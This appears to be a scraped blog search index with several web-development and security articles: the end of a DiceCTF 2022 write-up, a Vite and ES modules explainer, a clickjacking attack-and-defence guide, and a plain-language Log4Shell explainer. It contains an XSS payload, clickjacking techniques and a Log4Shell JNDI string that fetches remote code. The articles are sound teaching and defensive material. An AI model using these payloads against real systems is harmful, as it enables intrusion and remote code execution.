https://chromium.googlesource.com/chromium/src/+/refs/tags/100.0.4875.3/third_party/blink/renderer/core/editing/commands/editor_command_names.h#35 Here are three things to look into in the future: Study all the commands that document.execCommand can execute. Study all global functions. Study all CSS properties supported by Chrome. ConclusionAlthough I only solved 1 web question out of 10, I still gained a lot. Here are some new things I learned: Node.js wraps modules in functions. You can’t use import &quot;fs&quot;, but you can use import(&quot;fs&quot;).then(). Some characters in JS change length after being converted to uppercase or lowercase. RegExp.input, also known as RegExp.$_, can be used to get the last input that was compared. &lt;svg&gt;&lt;svg onload=alert()&gt; is executed synchronously, which is really amazing. You can fill the connection pool to execute a timing attack. -webkit-user-modify can do similar things to contenteditable. window.find and document.execCommand(&#39;findString&#39;, false, &#39;steal&#39;) can highlight the corresponding string. “I feel that the techniques I learned this time will also be very useful in other CTF competitions.”","link":"/2022/02/08/en/what-i-learned-from-dicectf-2022/"},{"title":"Why is Vite so fast? Starting with ES modules","text":"IntroductionHave you ever heard of vite? With a name starting with “v”, you might guess that it’s related to Vue. Yes, it’s another tool developed by the creator of Vue, Evan You. Originally intended for use with VuePress, it has proven to be much more versatile. On the GitHub page for Vite, there are only two sentences: Native-ESM powered web dev build tool. It’s fast. If you’ve tried it, you’ll know that it really is fast. Vite is a combination of a build tool and a dev server. In this article, we’ll briefly introduce how to use Vite, then talk about ES modules, and finally explore the magic of Vite. Exploring ViteLet’s start by discussing what Vite does. We can see from its positioning that it is a build tool + dev server. Let’s focus on the latter. The dev server is like the webpack dev server + hot module reload that we use with webpack. It provides a local development environment that automatically updates the entire app when we save a file. It’s an indispensable tool for front-end development. Vite’s concept is similar. It provides a “faster dev server” for us to use during development. Let’s go through the process. Although Vite integrates best with Vue, it is not exclusively a Vue tool. In fact, you can use it to develop anything, and Vite also provides a React template. Let’s use React as an example: npm init vite-app react-demo --template react cd react-demo npm install npm run dev With just these four lines of code, you can experience the power of Vite. The first line uses Vite’s tools to generate a boilerplate, and then you can start developing by entering the folder. After a successful installation, the terminal will tell you that the dev server is running. Then open: http://localhost:3000, and you’ll see the familiar spinning React logo. Next, let’s try opening src/App.jsx and making some changes. You’ll see that the React app updates very quickly. Vite is much faster than create-react-app or webpack dev server, both in terms of startup speed and update speed. Some people have compared the two on Twitter, and Vite is clearly the winner. Why is Vite so fast? It’s because of Native ES Modules. So next, let’s take a look at what Native ES Modules are. Native ES ModulesBefore we continue, I suggest that you first understand the history of module development in JavaScript. You can refer to my previous article: A Beginner’s Guide to Webpack: An Introduction to Modularity and Snowpack. In the article, I mentioned that there was no native module mechanism in browsers in the early days, so various standards were created, such as CommonJS, AMD, or UMD. However, this changed with ES6, because the ES6 specification finally included modules! We call this ES Modules, or ESM for short. ESM is a specification that you’ve probably used before, which looks like this: &#x2F;&#x2F; a.js export const PI &#x3D; 3.14 &#x2F;&#x2F; b.js import &#123; PI &#125; from &#39;.&#x2F;a&#39; If you see export and import, it’s probably ESM syntax. In addition to the specification, what’s even more exciting is that all mainstream browsers now natively support ESM! I’ve created a simple demo website here: https://aszx87410.github.io/esm-demo/vanilla/index.html After opening it, you can open the devtool and switch to the network tab. You’ll see that both index.js and utils.js use ESM syntax: Vite uses the native ESM loading mechanism, which is Native ESM, allowing the browser to handle these import and export things for you. Wait, I just emphasized the word “native”. Does that mean there are other things that are not native? Yes, that’s right. The webpack or similar tools you usually use, don’t forget that its name is “bundler”, which is to bundle your JS files and dependencies together. Although you use import and export correctly when writing code, it may have been converted to CommonJS or other forms by babel or webpack when output, and there is also an outer layer to handle the syntax of require. And this is also the reason why webpack and other bundling tools are slow. They need to statically analyze all files and package dependencies of the app, and then package things together based on this information. When your file becomes larger and larger, the time spent naturally increases because webpack needs to figure out how to package it. If we can avoid bundling and not package everything together, will it be much faster? Yes, this is why Vite is so fast. Exploring Vite againIn the earlier article, I mentioned snowpack. In fact, the concept of snowpack is quite similar to Vite, both of which use the Native ESM solution. Instead of bundling everything together, it is better to use the browser well and let the browser handle those complex dependencies. For example, snowpack will put the node_modules you use in a specific place so that you can import them. Next, let’s take a look at Vite. Open the demo project we just installed, turn on devtool, and switch to network. It is clear at a glance: The principle is quite similar to snowpack, both using ESM to load different packages, which is why there are so many requests in the browser. Click on main.jsx to see the code inside: import React from \"/@modules/@pika/react/source.development.js\"; import ReactDOM from \"/@modules/@pika/react-dom/source.development.js\"; import \"/src/index.css?import\"; import App2 from \"/src/App.jsx\"; ReactDOM.render(/* @__PURE__ */ React.createElement(React.StrictMode, null, /* @__PURE__ */ React.createElement(App2, null)), document.getElementById(\"root\")); On the server side, Vite will help us transform the program a bit. Here, it will replace import React from &#39;react&#39; in the program and change the path to its own prepared React build. This is because React official currently does not have an ESM build! What everyone is using now seems to be a mixture of UMD and CommonJS. There are plans for the future, but it may take some time. For details, please refer to: #11503 Formalize top-level ES exports. Although the official version does not exist, someone in the community has already done it, so the community version is used here. By the way, I will add one more thing. The original import React from &#39;react&#39; is called “bare module imports”, and “bare” refers to the react behind it, which is not a file path. According to Evan You, this is undefined behavior in the ESM standard, so it needs to be handled specially. If we change the ESM small example we tried earlier, import &#123; add &#125; from &#39;./utils.js&#39; to import &#123; add &#125; from &#39;utils.js&#39;, this error will appear: Uncaught TypeError: Failed to resolve module specifier “utils.js”. Relative references must start with either “&#x2F;“, “.&#x2F;“, or “..&#x2F;“. So it must start with /, ./, or ../. Next, let’s take a look at App.jsx: import &#123; createHotContext &#125; from \"/vite/client\"; import.meta.hot = createHotContext(\"/src/App.jsx\"); import RefreshRuntime from \"/@react-refresh\"; let prevRefreshReg; let prevRefreshSig; if (!window.__vite_plugin_react_preamble_installed__) &#123; throw new Error( \"vite-plugin-react can't detect preamble. Something is wrong. See https://github.com/vitejs/vite-plugin-react/pull/11#discussion_r430879201\" ); &#125; if (import.meta.hot) &#123; prevRefreshReg = window.$RefreshReg$; prevRefreshSig = window.$RefreshSig$; window.$RefreshReg$ = (type, id) => &#123; RefreshRuntime.register(type, \"/Users/huli/Documents/lidemy/test/react-demo/src/App.jsx\" + \" \" + id) &#125;; window.$RefreshSig$ = RefreshRuntime.createSignatureFunctionForTransform; &#125;var _s = $RefreshSig$(); import React, &#123; useState &#125; from \"/@modules/@pika/react/source.development.js\"; import logo2 from \"/src/logo.svg?import\"; import \"/src/App.css?import\"; function App2() &#123; _s(); const [count, setCount] = useState(0); return /* @__PURE__ */React.createElement(\"div\", &#123; className: \"App\" &#125;, /* @__PURE__ */React.createElement(\"header\", &#123; className: \"App-header\" &#125;, /* @__PURE__ */React.createElement(\"img\", &#123; src: logo2, className: \"App-logo\", alt: \"logo\" &#125;), /* @__PURE__ */React.createElement(\"p\", null, \"Hello Vite + React!wwaaaa\"), /* @__PURE__ */React.createElement(\"p\", null, /* @__PURE__ */React.createElement(\"button\", &#123; onClick: () => setCount(count2 => count2 + 1) &#125;, \"count is: \", count)), /* @__PURE__ */React.createElement(\"p\", null, \"Edit \", /* @__PURE__ */React.createElement(\"code\", null, \"App.jsx\"), \" and save to test HMR updates.\"), /* @__PURE__ */React.createElement(\"a\", &#123; className: \"App-link\", href: \"https://reactjs.org\", target: \"_blank\", rel: \"noopener noreferrer\" &#125;, \"Learn React\"))); &#125; _s(App2, \"oDgYfYHkD9Wkv4hrAPCkI/ev3YU=\"); _c = App2; export default App2; var _c; $RefreshReg$(_c, \"App2\"); if (import.meta.hot) &#123; window.$RefreshReg$ = prevRefreshReg; window.$RefreshSig$ = prevRefreshSig; import.meta.hot.accept(); RefreshRuntime.performReactRefresh(); &#125; You can see that the original jsx has been converted to JS on the server, and there is some code related to HMR (Hot Module Reload). If you try to modify the source code and save it, you will find that the URL of the network request has an additional timestamp: It can be guessed that this should be related to cache invalidation, to avoid loading the old one when reloading the module, so a timestamp is added to force re-fetching. Finally, let’s take a look at how CSS is handled: import &#123; updateStyle &#125; from \"/vite/client\" const css = \".App &#123;\\n text-align: center;\\n&#125;\\n\\n.App-logo &#123;\\n height: 40vmin;\\n pointer-events: none;\\n&#125;\\n\\n@media (prefers-reduced-motion: no-preference) &#123;\\n .App-logo &#123;\\n animation: App-logo-spin infinite 20s linear;\\n &#125;\\n&#125;\\n\\n.App-header &#123;\\n background-color: #282c34;\\n min-height: 100vh;\\n display: flex;\\n flex-direction: column;\\n align-items: center;\\n justify-content: center;\\n font-size: calc(10px + 2vmin);\\n color: white;\\n&#125;\\n\\n.App-link &#123;\\n color: #61dafb;\\n&#125;\\n\\n@keyframes App-logo-spin &#123;\\n from &#123;\\n transform: rotate(0deg);\\n &#125;\\n to &#123;\\n transform: rotate(360deg);\\n &#125;\\n&#125;\\n\\nbutton &#123;\\n font-size: calc(10px + 2vmin);\\n&#125;\\n\" updateStyle(\"\\\"7ac702d2\\\"\", css) export default css Turn CSS into a string and then call the updateStyle function. As long as Vite is loaded on the client, /vite/client utils will be automatically loaded together, which will handle things like HMR or loading CSS. For example, the updateStyle above is in this file. Alright, by now we have a general understanding of what Vite is. Why is it faster? Because webpack needs to bundle, but Vite doesn’t, so it doesn’t need to package all of your source code together. It only needs to start a local server so that your import can fetch the correct files. Without the need for packaging, the speed is naturally much faster, and this is the power of Native ESM. How about production?Just run npx vite build to generate a production build, but the resulting file may disappoint you because, like webpack, it’s a large package of index.js with all the code inside. This is because production currently uses rollup to build, which is a traditional packaging strategy, no different from webpack. The reason is also stated in Vite’s docs: Vite does utilize bundling for production builds, because native ES module imports result in waterfall network requests that are simply too punishing for page load time in production. Let me explain what this problem is. The problem comes from the dependencies between packages. Suppose you use a package A that needs to load package B, and package B depends on package C, and so on, creating a long chain of dependencies that extends to the sky. The browser has to wait until all these packages are downloaded before it can start executing JavaScript. This is what the original text refers to as “waterfall network requests,” so using this method in production is problematic. Especially with HTTP&#x2F;1.1, browsers have a parallel limit, mostly around 5, so if you have 60 dependencies to download, you have to wait for a long time. Although HTTP&#x2F;2 can improve this problem to some extent, it still can’t handle too many things. So why isn’t there a problem locally? Because the download time of the local server is almost 0! So this is an issue that only occurs in production. And this problem has already been addressed by some, such as pika: Pika is building a world where third-party libraries can be loaded, cached, and shared across sites. As I understand it, it’s a bit like if everyone’s ESM is downloaded from pika, the browser can cache these packages, and the downloaded ones don’t need to be downloaded again, so the speed will be much faster. But of course, there are still other issues to be resolved, such as whether the browser will provide so much space for you to put things, and so on. ConclusionVite seems to have sparked a small trend recently, with some open-source projects asking if there is a chance to switch to Vite as a dev server. Although snowpack has been out for a while, this use of Native ESM should be better known when Vite becomes popular. I personally think that when developing locally, ESM can indeed make things much faster, and it’s a direction worth trying. I even think that in the future, this may be the standard development method, replacing the original bundler. And if we can solve the waterfall problem I just mentioned in production, we may be able to produce two targets: one is for modern browsers, which directly uses ESM + ES6 output, saving a lot of build time; the other is for older browsers, which uses the old way with webpack or rollup, etc. Evan You previously recorded a podcast with Adam Wathan (author of Tailwind CSS), talking about why he wanted to make Vite, the future development direction of Vite, and the problems it may encounter in production builds, etc. I highly recommend everyone to listen to it: 140: Evan You - Reimagining the Modern Dev Server with Vite.","link":"/2020/08/08/en/vite-and-esmodules/"},{"title":"What is Clickjacking Attack","text":"IntroductionAmong various attack methods targeting front-end, I find clickjacking quite interesting. Its Chinese translation is usually “click hijacking”, which actually means that you think you clicked something on website A, but in fact, you clicked on website B. Malicious websites hijack users’ clicks, making them click on unexpected places. Just a click, what harm can it cause? Suppose it is a bank transfer page in the background, and the account number and amount are filled in. Just press a button and the money will be transferred out. This is very dangerous (but usually unlikely, because transferring money still requires entering OTP and the like, this is just an example). Or take a more common example. There is a page that looks like a page for unsubscribing from an email newsletter, so you click the “Confirm Unsubscribe” button, but actually, there is a Facebook Like button hidden underneath, so you not only did not unsubscribe, but also gave a Like (because the target of hijacking is Like, it is also called likejacking). In this article, I will introduce the attack principle, defense methods, and practical cases of clickjacking, so that everyone can better understand this attack method. Clickjacking Attack PrincipleThe principle of clickjacking is to stack two web pages together, and use CSS to make the user see website A, but click on website B. In more technical terms, it is to embed website B using iframe and set the transparency to 0.001, and then use CSS to stack its own content on top of it, and it’s done. I think the most interesting way to understand clickjacking is to look at examples, so I made some simple examples. In the following example, you can click the “Confirm Unsubscribe” button first, and then click “Switch Transparency” to see that the background is actually a page for modifying personal information and deleting the account button: So I thought I clicked “Confirm Unsubscribe”, but in fact, I clicked “Delete Account”, this is clickjacking. If the above iframe cannot be opened, you can play here: clickjacking example. Some people may think that this example is too simple, and in actual applications, such simple attacks may rarely occur. Maybe more websites will be a little more complicated, such as requiring input of something first? In the following example, “Change Email” function is designed for clickjacking. Compared with the previous example where the entire webpage is covered, this example deliberately leaves the input of the original webpage, and covers everything else with CSS. The button part uses pointer-events:none to let the event penetrate. It seems to be a webpage for entering email subscription information, but after clicking OK, it pops up “Email modification successful”, because the background is actually a webpage for modifying email: If you didn’t see the above example, you can play here: Advanced clickjacking example. In addition, I also saw a very interesting example in The latest cross-browser exploit-Clickjacking: Fake game, real hijacking (YouTube video), which seems to be a game but actually just wants you to click the button, super interesting! To summarize clickjacking, the attack method is roughly: Embed the target webpage into the malicious webpage (through iframe or other similar tags) Use CSS on the malicious webpage to cover the target webpage, making it invisible to the user Induce the user to go to the malicious webpage and make an operation (input or click, etc.) Trigger the behavior of the target webpage to achieve the attack Therefore, the difficulty of the actual attack depends on how well your malicious website is designed and how much interaction the target webpage requires. For example, clicking a button is much easier than entering information. Also, it should be reminded that to achieve this kind of attack, the user must be logged in to the target website first. As long as the target webpage can be embedded in the malicious webpage, there will be a risk of clickjacking. Clickjacking Defense MethodsAs mentioned earlier, any webpage that can be embedded in another webpage is at risk of clickjacking. In other words, if a webpage cannot be embedded, there will be no clickjacking issue. This is the way to solve clickjacking. Generally, there are two ways to defend against clickjacking. One is to use JavaScript to check, and the other is to inform the browser whether the webpage can be embedded through the response header. Frame bustingThere is a method called frame busting, which is the JavaScript check I mentioned earlier. The principle is very simple, and the code is also very simple: if (top !== self) &#123; top.location = self.location &#125; Each webpage has its own window object, and window.self points to its own window. top refers to the top window, which can be thought of as the top-level window of the entire browser “tab.” If a webpage is opened independently, top and self will point to the same window. However, if the webpage is embedded in an iframe, top will refer to the window that uses the iframe. For example, suppose I have an index.html on localhost that contains: &lt;iframe src=\"https://example.com\">&lt;/iframe> &lt;iframe src=\"https://onedegree.hk\">&lt;/iframe> Then the relationship diagram will be like this: The green and yellow colors are two webpages loaded in iframes, which are two different windows. If you access top in these two webpages, it will be the window object of localhost/index.html. Therefore, by checking if (top !== self), you can know whether you are in an iframe. If so, change top.location to redirect the top-level webpage to another location. It sounds good and there doesn’t seem to be any problems, but it can actually be bypassed by the sandbox attribute of the iframe. An iframe can set an attribute called sandbox, which means that the functionality of the iframe is restricted. If the restrictions need to be lifted, they must be explicitly specified. The values that can be specified include: allow-forms, allowing form submission allow-scripts, allowing JS execution allow-top-navigation, allowing changes to top location allow-popups, allowing pop-ups (There are many more, please refer to MDN: iframe for details.) That is to say, if I load the iframe like this: &lt;iframe src=\"./busting.html\" sandbox=\"allow-forms allow-scripts\"> Even if busting.html has the protection I mentioned above, it will not work because JavaScript will not execute, so that script will not run. However, the user can still submit the form normally. So someone proposed a more practical method, which is to make some improvements on the existing basis (code taken from: Wikipedia - Framekiller): &lt;style>html&#123;display:none;&#125;&lt;/style> &lt;script> if (self == top) &#123; document.documentElement.style.display = 'block'; &#125; else &#123; top.location = self.location; &#125; &lt;/script> First, hide the entire webpage. JavaScript must be executed to open it, so if the sandbox is used to prevent script execution, only a blank webpage will be seen. If the sandbox is not used, the JS check will not pass, so a blank page will still be seen. Although this can achieve more complete defense, there are also drawbacks. The drawback is that if the user turns off the JS function, they will not see anything. Therefore, for users who turn off the JS function, the experience is not very good. When clickjacking first came out (in 2008), the relevant defense may not have been so complete, so these methods had to be used. However, in 2021, browsers have supported better ways to block webpages from being embedded. X-Frame-OptionsThis HTTP response header was first implemented by IE8 in 2009, and other browsers followed suit. It became a complete RFC7034 in 2013. This header has the following three values: X-Frame-Options: DENY X-Frame-Options: SAMEORIGIN X-Frame-Options: ALLOW-FROM https://example.com/ The first one is to reject any webpage from embedding this webpage, including &lt;iframe&gt;, &lt;frame&gt;, &lt;object&gt;, &lt;applet&gt;, and &lt;embed&gt; tags. The second one only allows same-origin webpages, while the last one only allows specific origins to be embedded. Other than that, nothing else is allowed (only one value can be put, not a list, so if you want multiple origins, you need to adjust the output dynamically on the server like the CORS header). RFC also specifically mentions that the judgment of the last two methods may be different from what you think, and the implementation of each browser may vary. For example, some browsers may only check the “previous layer” and the “top layer” instead of checking every layer. What does “layer” mean? Because theoretically, an iframe can have an infinite number of layers, A embeds B embeds C embeds D… If this relationship is visualized as an HTML tag, it would look like this: &lt;example.com&#x2F;A.html&gt; &lt;attacker.com&gt; &lt;example.com&#x2F;B.html&gt; &lt;example.com&#x2F;target.html&gt; For the innermost target.html, if the browser only checks the previous layer (B.html) and the top layer (A.html), then even if it is set to X-Frame-Options: SAMEORIGIN, the check will still pass because these two layers are indeed the same origin. However, in reality, there is a malicious webpage sandwiched in between, so there is still a risk of being attacked. In addition, X-Frame-Options has a second problem, which is that the support for ALLOW-FROM is not good. You can refer to the table below from caniuse, where the yellow ones do not support ALLOW-FROM: The X at the beginning of X-Frame-Options indicates that it is more like a transitional thing, and its function will be replaced by CSP (Content Security Policy) in future new browsers, and the above-mentioned problems will be solved. CSP: frame-ancestorsIn a previous article: A Brief Discussion on the Various Links in XSS Attacks and Defenses, I briefly mentioned CSP, which is basically telling the browser some security-related settings, one of which is frame-ancestors, which is set up like this: Content-Security-Policy: frame-ancestors ‘none’ Content-Security-Policy: frame-ancestors ‘self’ Content-Security-Policy: frame-ancestors https://a.example.com https://b.example.com These three correspond exactly to the three types of X-Frame-Options mentioned earlier: DENY, SAMEORIGIN, and ALLOW-FROM (but this time multiple origins are supported). First, let’s talk about a place that may be confusing. The behavior restricted by frame-ancestors is the same as X-Frame-Options, which is “which webpages can embed me using iframe”, while another CSP rule frame-src is: “which sources of iframe can my webpage load”. For example, if I set a rule in index.html as frame-src: &#39;none&#39;, then any webpage loaded with &lt;iframe&gt; in index.html will be blocked, regardless of whether that webpage has set anything. Another example, if I set my index.html to frame-src: https://example.com, but example.com also sets frame-ancestors: &#39;none&#39;, then index.html still cannot load example.com with iframe because the other party refused. In summary, frame-src is “are we getting along?”, while frame-ancestors is the answer to this request. I can set it to frame-ancestors: &#39;none&#39;, which means I don’t want anyone to confess to me. Both parties must agree for the browser to successfully display the iframe. Also, it is worth noting that frame-ancestors is a rule supported by CSP level2, and it gradually began to be supported by mainstream browsers at the end of 2014. Defense SummaryDue to compatibility issues, it is recommended to use X-Frame-Options and CSP’s frame-ancestors together. If you don’t want your webpage to be loaded in an iframe, remember to add the HTTP response header: X-Frame-Options: DENY Content-Security-Policy: frame-ancestors &#39;none&#39; If you only allow loading from the same origin, set it to: X-Frame-Options: SAMEORIGIN Content-Security-Policy: frame-ancestors &#39;self&#39; If you want to specify an allow list of sources, it is: X-Frame-Options: ALLOW-FROM https:&#x2F;&#x2F;example.com&#x2F; Content-Security-Policy: frame-ancestors https:&#x2F;&#x2F;example.com&#x2F; Actual CasesNext, let’s take a look at some actual clickjacking cases, which will give you a better sense of this attack. YelpThe largest restaurant review website in the United States, Yelp, has several reports on clickjacking: ClickJacking on IMPORTANT Functions of Yelp CRITICAL-CLICKJACKING at Yelp Reservations Resulting in exposure of victim Private Data (Email info) + Victim Credit Card MissUse. Although it cannot achieve serious attacks such as account theft, it can still cause some harm, such as stealing users’ emails by helping them make reservations, or causing financial losses by charging cancellation fees when users cancel reservations. For restaurants that are disliked, this method can also be used to create many fake reservations, making it difficult for restaurants to distinguish (because they are all real users making reservations). Twitter Periscope Clickjacking VulnerabilityOriginal report: https://hackerone.com/reports/591432Date: May 2019 This bug is due to compatibility issues. The webpage only sets X-Frame-Options ALLOW-FROM without setting CSP. This is actually useless because modern browsers do not support ALLOW-FROM. The solution is simple, just add CSP’s frame-ancestors to make modern browsers also follow this rule. Highly wormable clickjacking in player cardOriginal report: https://hackerone.com/reports/85624Date: August 2015 This vulnerability is quite interesting and uses the browser implementation issues mentioned earlier. In this case, Twitter has already set X-Frame-Options: SAMEORIGIN and Content-Security-Policy: frame-ancestors &#39;self&#39;, but at that time, some browser implementations only checked whether the top window met the conditions. In other words, if it is twitter.com &#x3D;&gt; attacker.com &#x3D;&gt; twitter.com, it will pass the check, so it can still be embedded in a malicious webpage. In addition, this vulnerability occurred in Twitter’s timeline, so it can achieve the effect of a worm. After clickjacking, it will tweet, and then more people will see it and tweet the same thing. The author’s writeup is great, but the blog is down, this is the archive: Google YOLO [api.tumblr.com] Exploiting clickjacking vulnerability to trigger self DOM-based XSSOriginal report: https://hackerone.com/reports/953579Date: August 2020 I specifically chose this case because it is a chain of attacks! In XSS vulnerabilities, there is a type called self XSS, which means that usually users have to perform some operations themselves to be attacked, so the impact is very limited, and many programs do not accept self XSS vulnerabilities. And this report links self XSS with clickjacking, allowing users to trigger self XSS through clickjacking, making the attack chain easier to achieve and more feasible. The above are some practical examples related to clickjacking. It is worth noting that some of them are issues caused by compatibility issues, not lack of settings, so setting correctly is also important. Unpreventable clickjacking?The way to defend against clickjacking is to not let others embed your webpage, but what if the purpose of this webpage is to let others embed it? For example, the Facebook widget, the “like” and “share” buttons that we often see, are designed to be embedded by others using iframes. What should be done with this type of widget? According to these two articles: Clickjacking Attack on Facebook: How a Tiny Attribute Can Save the Corporation Facebook like button click The information obtained inside may only reduce user experience a little in exchange for security. For example, after clicking the button, a popup will still appear for you to confirm. For users, there is one more click, but it also avoids the risk of likejacking. Or I guess it may also decide whether to have this behavior based on the source of the website. For example, on some more reputable websites, this popup may not appear. I have made a simple demo webpage: https://aszx87410.github.io/demo/clickjacking/like.html If likejacking is successful, clicking the button will like the Facebook Developer Plugin fan page (I have successfully experimented with it myself). Everyone can try it out and click “Show original webpage” to see what the button looks like underneath, and also retract the like. SummaryCompared to the era when browser support was not so complete in the past, we are now much happier. Browsers have also implemented more and more security features and new response headers to protect users from malicious attacks. Although the difficulty, prerequisites, and impact of clickjacking attacks are usually lower than attacks such as XSS or CSRF on average, it is still one of the risks that cannot be ignored. If your webpage does not allow other websites to be embedded, remember to set X-Frame-Options: DENY and Content-Security-Policy: frame-ancestors &#39;none&#39; to tell the browser that your webpage cannot be embedded, thereby preventing clickjacking attacks. References: TOPCLICKJACKING.md Clickjacking Defense Cheat Sheet CSP frame-ancestors","link":"/2021/09/26/en/what-is-clickjacking/"},{"title":"Understanding the Log4j and Log4Shell Vulnerabilities through Surveillance Cameras","text":"The biggest news in the cybersecurity industry at the end of 2021 is undoubtedly the Log4j vulnerability, also known as CVE-2021-44228 or Log4Shell. Some even describe it as a “nuclear-level vulnerability,” highlighting the far-reaching impact of this vulnerability. While there are many technical analyses of the vulnerability, those without technical backgrounds may only know that the vulnerability is severe without understanding why or how it works. Therefore, I want to write a more straightforward article that non-technical people can understand. Starting with Surveillance CamerasI have a friend named Xiao Ming, who runs a grocery store. Like other stores, there is a surveillance camera in the store to record everything 24&#x2F;7 in case of disputes or theft. However, the camera’s field of view is limited, and it cannot capture the entire store. Even if it could, storing all that data would be too much (unless Xiao Ming is rich and buys a bunch of cameras). Therefore, the camera only focuses on critical areas, such as the cash register. For over a decade, there were no issues with the camera. After all, it’s just recording video, what could go wrong? But recently, someone discovered a hidden feature of the camera (strictly speaking, it’s not a hidden feature since it’s mentioned in the camera’s manual, but few people bother to read the hundred-plus pages). What is this feature? Besides recording video, the camera also has an intelligent image recognition feature. If it sees specific images, it will execute corresponding actions based on the image’s content. For example, this image recognition feature requires instructions to be written on a 100x100 board with a black background, white text, and a specific format, like this: When the camera sees the image above, which matches the specific format, it executes the command: “Shutdown,” and the camera shuts down! But shutting down is not the only thing the command can do. It can also be written to “give me all the camera data” or perform operations on other servers that the camera is connected to, such as stealing all the data. In short, once the camera captures something in the specified format, it will execute the command for you. After this feature was exposed, chaos ensued because there are surveillance cameras everywhere. Therefore, many people brought this board to see if it would trigger this feature. Only one camera model called log4j has issues, while others do not. However, some cameras are based on log4j and have been modified, so they will also have problems. Even things that are not cameras can have issues. For example, a smart refrigerator claims to have a miniature camera that can monitor the inside of the refrigerator in real-time. Coincidentally, this miniature camera is a modified version of the log4j camera model, so it has the same problem. Think about it. If surveillance cameras have this problem, then so many people around the world use this camera model. It will undoubtedly cause a huge uproar because once the camera captures something in the specified format, it will execute the command, which is severe. The above is a simple analogy of the log4j vulnerability. In this story, the grocery store is like your website, and the camera’s function is to record (log) requests to your website. There are only two key points to remember in this story: Log4j is used to record things. The vulnerability principle is that recording certain specific text formats will trigger a function that can execute code. The simple analogy ends here. To understand log4j better, we must first understand what logs are. About LogsThe Chinese translation of logs is “日誌,” and I believe many people are familiar with this term. If you have worked with engineers, they may say, “I’ll check the logs” when solving problems. Or if you and your partner have different opinions, he says A, and you say B, you might say, “Let’s check the logs to see whose problem it is.” When you work with the IT department to solve small computer problems, he will also ask you to copy logs from a specific location to help him understand what happened. Logs are like a 24&#x2F;7 surveillance camera that needs to record the status of important things. So why do we need logs? This question is like “Why do we need surveillance cameras?” The answer is simple: because there is evidence when something goes wrong. Just like a driving recorder, if you have an accident, it can help determine who is at fault. For example, suppose I am Company A, and we run an online shopping website. Usually, we do not handle the payment process ourselves but cooperate with other payment service providers. We “connect” the payment service provider’s functions in the backend. In simpler terms, “when the user wants to pay, I redirect them to the payment service provider’s page, and when they finish paying, I redirect them back to our website.” I believe many people who shop online are familiar with this process. In this process, both parties must keep records to ensure that there is evidence to assist in explaining any future problems. For example, one day, Company A suddenly received a bunch of complaints saying that they could not make payments. Company A called the payment service provider and complained that their service was terrible and suddenly stopped working. However, the payment service provider provided server logs, saying, “No, we haven’t received any records from you since 8 am today. It should be your problem.” Later, Company A checked its own service and found that there was a problem with the version update this morning, and it had nothing to do with the payment service provider. This is the importance of logs. When something goes wrong, you have evidence to investigate and try to restore the original situation as much as possible. As developers, we all know the importance of logs, so logs are basically a must-have. For a website backend, it may leave a log when a transaction fails, or write a log when an unexpected error occurs, or use a log to record some fields in the request, such as the browser version, for use by the company’s internal data analysis system. Therefore, logs are a very common feature. This is also why if this feature goes wrong, the consequences can be very serious. What is log4j?When writing code for a website backend, there are different programming languages to choose from, such as Python, JavaScript, PHP, or Java, and these programming languages will have some packages specialized in logging, which means someone has already written the functionality for you, and you just need to use it. Java has a very useful logging package called log4j. This package belongs to the Apache Software Foundation, so its full name is Apache Log4j. There are many different software and packages under Apache, such as: Apache HTTP Server (the most commonly seen one) Apache Cassandra Apache Tomcat Apache Hadoop Apache Struts … So Apache Server and Apache log4j are completely different things. I know you use Apache Server, but whether you use log4j is another matter. The package that caused the problem this time is log4j, and the reason for the problem is the same as what I said at the beginning. There is a little-known feature with a security vulnerability. As long as log4j records something in a specific format when logging, it will execute the corresponding code, just like the “shutdown” board mentioned at the beginning. To be more specific, it does not directly execute the code. The specific format looks like this: $&#123;jndi:ldap:&#x2F;&#x2F;cymetrics.io&#x2F;test&#125; Don’t worry about the words you can’t understand. You can clearly see that there is a string that looks like a URL inside. Yes, it is a URL. When log4j records the above string, it finds that the string matches a specific format, so it will download the code from the URL (cymetrics.io/test) and execute it. Therefore, this is a Remote Code Execution (RCE) vulnerability. As I mentioned earlier, the backend will record many things. For example, if a backend service is written in Java and uses log4j to record the account entered when the user logs in fails, then I only need to log in with the account $&#123;jndi:ldap://cymetrics.io/test&#125; to trigger the log4j vulnerability and execute the code I prepared. As long as I can execute code, I can do many things, such as stealing data from the server or installing mining software to mine for me, and so on. Why is this vulnerability so serious?First, log4j is used by a large number of people. Almost everyone who uses Java will use this package to record logs. Second, the trigger method is easy. You only need to fill various parts of the request with these problematic strings. As long as the server records one of them, it can trigger the vulnerability, and as mentioned earlier, recording logs is a common thing. Third, the impact is huge. Once the vulnerability is triggered, it is the most serious RCE, which can directly execute any code. Combining these three points makes it a nuclear-level vulnerability. How serious is it? Just look at these news headlines: Apache Log4j vulnerability has a huge impact, US cybersecurity agencies order government agencies to fix it immediately Microsoft and Apple are affected! Log framework Apache Log4j has a vulnerability, which is the biggest cybersecurity threat in nearly 10 years 【Log4Shell vulnerability information update】Log4j 2.15.0 is not fully patched, Apache releases version 2.16.0, and national hackers have started to act One more thing I almost forgot to mention is that many other software also use the log4j package, so they may also have problems. Someone has compiled a list of affected software abroad: Log4Shell log4j vulnerability (CVE-2021-44228 &#x2F; CVE-2021-45046) - cheat-sheet reference guide, which is a long list. For example, the server of the game Minecraft also uses log4j, so it is also affected by this vulnerability. How to know if I am affected by this vulnerability?You can first check if your program uses the log4j package and its version, and also check if any of the other software listed in the above list is used. If you are an engineer, you can also use some existing tools to detect if you are affected by the vulnerability, such as: log4j-scan or log4j-tools provided by jfrog. Or if you really don’t know how to deal with it, you can also contact us to see how we can help you. How to fix it?In this article published by Swiss CERT: Zero-Day Exploit Targeting Popular Java Library Log4j, there is a chart that shows how to defend against it from various aspects: If there is no time to fix the root cause, you can first use WAF (Web Application Firewall), which is a firewall for websites that blocks malicious strings, such as Cloudflare which added WAF rules to block it at the first time. However, many people are researching how to bypass WAF rules, so this is a temporary solution. The fundamental solution is to disable or upgrade log4j to a version that is not affected by this vulnerability. However, sometimes the first version may not completely fix the vulnerability, so remember to closely monitor if there are updated versions after the upgrade. For example, shortly after this article was written, the official released the third patch to fix other related issues: Apache Issues 3rd Patch to Fix New High-Severity Log4j Vulnerability ConclusionA widely used package, combined with a common function, and a simple attack method with serious consequences, has become a vulnerability that can be recorded in history. Some of the metaphors in the article may be simplified versions to avoid being too detailed, and may not fully cover the original vulnerability. There may be some omissions in the process of converting it into a story metaphor, but I think it does not have a big impact on the overall understanding. If you want to understand more technical details and timelines, I highly recommend this video: Hackers vs. Developers &#x2F;&#x2F; 